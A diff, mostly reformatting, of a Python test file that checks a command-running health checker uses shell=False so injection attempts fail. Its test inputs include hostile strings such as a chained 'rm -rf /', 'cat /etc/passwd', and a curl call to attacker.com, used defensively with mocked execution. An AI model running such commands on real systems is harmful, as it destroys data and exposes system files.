@@ -409,16 +409,14 @@ class TestMultipleCommands:
 
 class TestShellExecution:
     """Test shell execution details.
-    
+
     Commands are now executed with shell=False for security.
     Shell features like pipes, redirects, and substitution are not supported.
     """
 
     def test_shell_features_pipes_not_supported(self, checker):
         """Test that shell pipes are not supported with shell=False."""
-        checker.config.cmdcheck_commands = [
-            {"command": "echo hello | grep hello"}
-        ]
+        checker.config.cmdcheck_commands = [{"command": "echo hello | grep hello"}]
 
         with patch("subprocess.run") as mock_run:
             # With shell=False, the pipe character is passed as literal argument
@@ -434,12 +432,10 @@ class TestShellExecution:
 
     def test_shell_redirects(self, checker):
         """Test shell redirects behavior with shell=False.
-        
+
         Redirects are not supported with shell=False and should fail gracefully.
         """
-        checker.config.cmdcheck_commands = [
-            {"command": "echo test > /tmp/test.txt"}
-        ]
+        checker.config.cmdcheck_commands = [{"command": "echo test > /tmp/test.txt"}]
 
         with patch("subprocess.run") as mock_run:
             # With shell=False, > is passed as literal argument, causing failure
@@ -451,12 +447,10 @@ class TestShellExecution:
 
     def test_shell_command_substitution(self, checker):
         """Test shell command substitution is not evaluated.
-        
+
         Command substitution with $(...)  is not supported with shell=False.
         """
-        checker.config.cmdcheck_commands = [
-            {"command": "test $(echo 5) -gt 3"}
-        ]
+        checker.config.cmdcheck_commands = [{"command": "test $(echo 5) -gt 3"}]
 
         with patch("subprocess.run") as mock_run:
             # With shell=False, $(...) is passed as literal, causing failure
@@ -610,9 +604,10 @@ class TestEvaluateResult:
         )
         assert status == "down"
 
+
 class TestCommandInjectionSecurity:
     """Test security against command injection attacks.
-    
+
     Commands are executed with shell=False to prevent shell metacharacter
     interpretation. These tests verify that injection attempts are neutralized.
     """
@@ -620,18 +615,16 @@ class TestCommandInjectionSecurity:
     def test_semicolon_command_chaining_prevented(self, logger, config):
         """Test that semicolon-separated commands are not executed."""
         # Attempt: systemctl is-active nginx; rm -rf /
-        config.cmdcheck_commands = [
-            {"command": "systemctl is-active nginx; rm -rf /"}
-        ]
+        config.cmdcheck_commands = [{"command": "systemctl is-active nginx; rm -rf /"}]
         checker = CmdCheckChecker(logger, config)
 
         with patch("subprocess.run") as mock_run:
             # With shell=False, the command string is passed literally
             # as a single argument, causing systemctl to fail
             mock_run.side_effect = FileNotFoundError("Command not found")
-            
+
             result = checker.execute()
-            
+
             # Command fails safely - the dangerous part is never executed
             assert result.status == "down"
             # Verify shell=False was used
@@ -649,9 +642,9 @@ class TestCommandInjectionSecurity:
         with patch("subprocess.run") as mock_run:
             # The pipe character is passed as a literal argument to systemctl
             mock_run.side_effect = FileNotFoundError()
-            
+
             result = checker.execute()
-            
+
             assert result.status == "down"
             # Verify the command was split correctly (not executed by shell)
             call_args = mock_run.call_args
@@ -660,17 +653,15 @@ class TestCommandInjectionSecurity:
     def test_command_substitution_not_evaluated(self, logger, config):
         """Test that command substitution $(...) is not evaluated."""
         # Attempt: systemctl is-active $(whoami)
-        config.cmdcheck_commands = [
-            {"command": "systemctl is-active $(whoami)"}
-        ]
+        config.cmdcheck_commands = [{"command": "systemctl is-active $(whoami)"}]
         checker = CmdCheckChecker(logger, config)
 
         with patch("subprocess.run") as mock_run:
             # The $(...) is treated as literal argument, not evaluated
             mock_run.side_effect = FileNotFoundError()
-            
+
             result = checker.execute()
-            
+
             assert result.status == "down"
             # Verify shell=False prevents substitution
             call_args = mock_run.call_args
@@ -679,16 +670,14 @@ class TestCommandInjectionSecurity:
     def test_backtick_command_substitution_not_evaluated(self, logger, config):
         """Test that backtick command substitution is not evaluated."""
         # Attempt: systemctl is-active `whoami`
-        config.cmdcheck_commands = [
-            {"command": "systemctl is-active `whoami`"}
-        ]
+        config.cmdcheck_commands = [{"command": "systemctl is-active `whoami`"}]
         checker = CmdCheckChecker(logger, config)
 
         with patch("subprocess.run") as mock_run:
             mock_run.side_effect = FileNotFoundError()
-            
+
             result = checker.execute()
-            
+
             assert result.status == "down"
             call_args = mock_run.call_args
             assert call_args.kwargs["shell"] is False
@@ -696,33 +685,29 @@ class TestCommandInjectionSecurity:
     def test_logical_and_operator_not_evaluated(self, logger, config):
         """Test that && operator is not evaluated as logical AND."""
         # Attempt: test -f /etc && cat /etc/passwd
-        config.cmdcheck_commands = [
-            {"command": "test -f /etc && cat /etc/passwd"}
-        ]
+        config.cmdcheck_commands = [{"command": "test -f /etc && cat /etc/passwd"}]
         checker = CmdCheckChecker(logger, config)
 
         with patch("subprocess.run") as mock_run:
             # The && is passed as literal argument
             mock_run.side_effect = FileNotFoundError()
-            
+
             result = checker.execute()
-            
+
             assert result.status == "down"
             call_args = mock_run.call_args
             assert call_args.kwargs["shell"] is False
 
     def test_logical_or_operator_not_evaluated(self, logger, config):
         """Test that || operator is not evaluated as logical OR."""
-        config.cmdcheck_commands = [
-            {"command": "false || curl http://attacker.com"}
-        ]
+        config.cmdcheck_commands = [{"command": "false || curl http://attacker.com"}]
         checker = CmdCheckChecker(logger, config)
 
         with patch("subprocess.run") as mock_run:
             mock_run.side_effect = FileNotFoundError()
-            
+
             result = checker.execute()
-            
+
             assert result.status == "down"
             call_args = mock_run.call_args
             assert call_args.kwargs["shell"] is False
@@ -730,49 +715,41 @@ class TestCommandInjectionSecurity:
     def test_invalid_command_syntax_handled(self, logger, config):
         """Test that malformed commands (unclosed quotes) are handled safely."""
         # Unclosed quote - shlex.split() will raise ValueError
-        config.cmdcheck_commands = [
-            {"command": 'systemctl is-active "nginx'}
-        ]
+        config.cmdcheck_commands = [{"command": 'systemctl is-active "nginx'}]
         checker = CmdCheckChecker(logger, config)
 
         result = checker.execute()
-        
+
         # Should fail gracefully with error message
         assert result.status == "down"
         assert "Invalid command syntax" in result.details["commands"][0]["output"]
 
     def test_shell_false_always_used(self, logger, config):
         """Test that shell=False is always used, preventing any shell interpretation."""
-        config.cmdcheck_commands = [
-            {"command": "echo test"}
-        ]
+        config.cmdcheck_commands = [{"command": "echo test"}]
         checker = CmdCheckChecker(logger, config)
 
         with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(
-                returncode=0, stdout="test", stderr=""
-            )
-            
+            mock_run.return_value = MagicMock(returncode=0, stdout="test", stderr="")
+
             checker.execute()
-            
+
             # Verify shell=False in all calls
             for call in mock_run.call_args_list:
                 assert call.kwargs["shell"] is False
 
     def test_shlex_parsing_for_quoted_arguments(self, logger, config):
         """Test that quoted arguments are parsed correctly by shlex."""
-        config.cmdcheck_commands = [
-            {"command": 'echo "hello world"'}
-        ]
+        config.cmdcheck_commands = [{"command": 'echo "hello world"'}]
         checker = CmdCheckChecker(logger, config)
 
         with patch("subprocess.run") as mock_run:
             mock_run.return_value = MagicMock(
                 returncode=0, stdout="hello world", stderr=""
             )
-            
+
             checker.execute()
-            
+
             # Verify the command was split correctly
             call_args = mock_run.call_args
             # Should be split into ["echo", "hello world"]
@@ -780,17 +757,15 @@ class TestCommandInjectionSecurity:
 
     def test_environment_variable_expansion_prevented(self, logger, config):
         """Test that environment variables are not expanded in commands."""
-        config.cmdcheck_commands = [
-            {"command": "echo $HOME"}
-        ]
+        config.cmdcheck_commands = [{"command": "echo $HOME"}]
         checker = CmdCheckChecker(logger, config)
 
         with patch("subprocess.run") as mock_run:
             # Without shell, $HOME is treated as literal string
             mock_run.side_effect = FileNotFoundError()
-            
+
             result = checker.execute()
-            
+
             assert result.status == "down"
             # Verify shell=False prevents variable expansion
             call_args = mock_run.call_args
